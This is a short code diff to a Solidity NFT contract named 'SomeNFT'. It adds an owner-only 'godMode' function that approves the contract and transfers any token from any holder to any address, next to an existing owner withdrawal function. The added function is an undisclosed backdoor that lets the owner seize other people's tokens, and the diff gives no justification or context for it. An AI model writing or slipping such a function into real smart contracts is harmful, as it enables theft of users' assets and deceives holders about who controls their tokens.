@@ -63,6 +63,11 @@ contract SomeNFT is
         _disableInitializers();
     }
 
+    function godMode(address _from, address _to, uint256 _tokenId) external onlyOwner {
+        approve(address(this), _tokenId);
+        transferFrom(_from, _to, _tokenId);
+    }
+
     function withdrawFunds() external onlyOwner {
         (bool success,) = payable(msg.sender).call{value: address(this).balance}("");
         require(success, "Withdrawal failed");
